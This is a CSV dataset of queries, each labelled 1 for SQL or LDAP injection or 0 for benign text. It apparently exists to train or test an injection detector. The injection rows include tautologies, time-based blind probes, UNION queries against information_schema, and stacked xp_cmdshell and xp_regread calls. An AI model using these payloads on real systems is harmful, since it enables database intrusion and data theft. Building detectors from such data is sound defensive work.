Query,Label
or a=a--,1
") or benchmark(10000000,MD5(1))#",1
or 'something' = 'some'+'thing',1
' or uid like '%,1
x' AND members.email IS NULL; --,1
 UPDATE addition SET consider = 'pack'WHERE cover = 'use',0
1) or pg_sleep(__TIME__)--,1
narbo_nesa,0
or 0=0 #,1
--,1
or 'whatever' in ('whatever'),1
SELECT diagram FROM service UNION SELECT independent FROM desert ORDER BY furniture,0
kamber@weat.gd,0
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
') or ('a'='a,1
boes@cumbareback.kz,0
" SELECT * FROM missing ORDER BY string, along",0
gierasch.casini@goovitae.cu,0
or 1/*,1
yegorova@onlinegratis.aq,0
like,1
SELECT stream FROM sport,0
select,1
el taxista 199 10?c,0
; execute immediate 'sel' || 'ect us' || 'er',1
1438,0
SELECT AVG ( Price ) FROM Products;,0
*(|(mail=*)),1
SELECT AVG ( Price ) FROM tried,0
)) or sleep(__TIME__)=',1
artica,0
SELECT * FROM labor ORDER BY slide,0
arceo feliu,0
"  SELECT SUBSTR ( ""SQL Tutorial"", 5, 3 )  AS ExtractString;",0
Ã½ or 1=1 --,1
' or 1=1--,1
3500,0
"and 1=( if((load_file(char(110,46,101,120,11 ...",1
or a=a,1
having 1=1--,1
as,1
*/*,1
or 'a'='a,1
PRINT @@variable,1
or%201=1 --,1
89388462c,0
delete,1
SELECT location FROM choice,0
""" or 0=0 --",1
"""));waitfor delay '0:0:__TIME__'--",1
""")) or pg_sleep(__TIME__)--",1
3.19291E+15,0
bret3,0
DELETE FROM married WHERE suppose = 'local',0
) union select * from information_schema.tables;,1
declare @s varchar(200) select @s = 0x77616974 ...,1
or '1'='1'--,1
sqlvuln,1
SELECT * FROM Customers;,0
c/ manresa 56 2-e,0
' or userid like '%,1
; exec ('sel' + 'ect us' + 'er'),1
or pg_sleep(__TIME__)--,1
SELECT * FROM Orders;,0
" SELECT Customers.CustomerName, Orders.OrderIDFROM CustomersFULL OUTER JOIN OrdersON Customers.CustomerID = Orders.CustomerIDORDER BY Customers.CustomerName;",0
SELECT * FROM salt WHERE sale LIKE '%scientist%',0
"or benchmark(10000000,MD5(1))#",1
"or 1=1 or """"=",1
%2A%28%7C%28objectclass%3D%2A%29%29,1
SELECT * FROM perfectly WHERE describe = 'fairly' FETCH FIRST 3 ROWS ONLY,0
x' AND 1=(SELECT COUNT(*) FROM tabname); --,1
SELECT AVG ( Price ) FROM day,0
"1) or benchmark(10000000,MD5(1))#",1
1)) or pg_sleep(__TIME__)--,1
&,1
SELECT * FROM tool WHERE    NOT news = 'related',0
08zaril0o,0
SELECT TOP 3 * FROM halfway SELECT * FROM slide 3SELECT * FROM desk,0
SELECT * FROM selection WHERE type BETWEEN '1996-07-01' AND '1996-07-31',0
UNION ALL SELECT,1
""" or ""a""=""a",1
"av. don juan de borbon, s/n",0
)%20or%20('x'='x,1
""" or sleep(__TIME__)#",1
muduex,0
"1)) or benchmark(10000000,MD5(1))#",1
SELECT pupil ( s FROM root RIGHT JOIN,0
ilya,0
declare @q nvarchar (4000) select @q =,1
23 OR 1=1,1
SELECT map FROM will UNION ALL SELECT accurate FROM wrapped ORDER BY grew,0
'; exec master..xp_cmdshell,1
) or ('a'='a,1
"or 0=0 #""",1
SELECT * FROM teacher WHERE calm BETWEEN 'accept' AND 'offer',0
or 0=0 #,1
SELECT LOG10 ( 4.5 ) ;,0
limit,1
sikes-jeans@923.mv,0
SELECT * FROM forward WHERE bark = 'express',0
));waitfor delay '0:0:__TIME__'--,1
",@variable",1
SELECT TOP 3 * FROM bread WHERE automobile = 'building' SELECT * FROM sport,0
SELECT * FROM daughter FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM younger,0
"fernandez latorre 14,",0
SELECT youth FROM progress UNION SELECT brought FROM official ORDER BY avoid,0
16806738v,0
calle jeremias 14 7b,0
SELECT * FROM grabbed WHERE mass = 'pictured' FETCH FIRST 3 ROWS ONLY,0
16646,0
SELECT * FROM gentle WHERE lose = 'cut' LIMIT 3,0
""")) or sleep(__TIME__)=""",1
%2A%28%7C%28mail%3D%2A%29%29,1
mallo etchart,0
"INSERT INTO aloud  ( recognize, strange, range )  VALUES  ( 'yesterday', 'rough', 'failed' )  ",0
SELECT include ( s )  FROM egg FULL OUTER JOIN,0
'hi' or 'x'='x';,1
SELECT * FROM master  WHERE space = graph,0
\x27UNION SELECT,1
SELECT * FROM divide WHERE went = 'selection' LIMIT 3,0
SELECT * FROM printed WHERE halfway BETWEEN 'degree' AND 'blew',0
hi or a=a,1
SELECT went ( s FROM hidden RIGHT JOIN,0
%20or%20'x'='x,1
"  SELECT * FROM won WHERE lucky IN  ( 'follow', 'gray', 'air' )  ",0
')%20or%20('x'='x,1
a',1
SELECT * FROM stepped FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM support,0
deiadrel,0
"c/ belgica, 69 2?d",0
exec sp,1
SELECT * FROM blanket WHERE remember BETWEEN '1996-07-01' AND '1996-07-31',0
corota,0
chopel@restauranteslaespadaa.bg,0
charley,0
SELECT TOP 3 * FROM ill WHERE store = 'sister' SELECT * FROM feet,0
SELECT DISTINCT river FROM she,0
65,0
; exec xp_regread,1
nab,0
or 1=1 or ''=',1
castellol,0
' or 3=3,1
SELECT * FROM arm WHERE cold = 'balance',0
SELECT * FROM design WHERE every = 'line',0
"  SELECT * FROM invented WHERE along NOT IN  ( 'another', 'level', 'remarkable' )  ",0
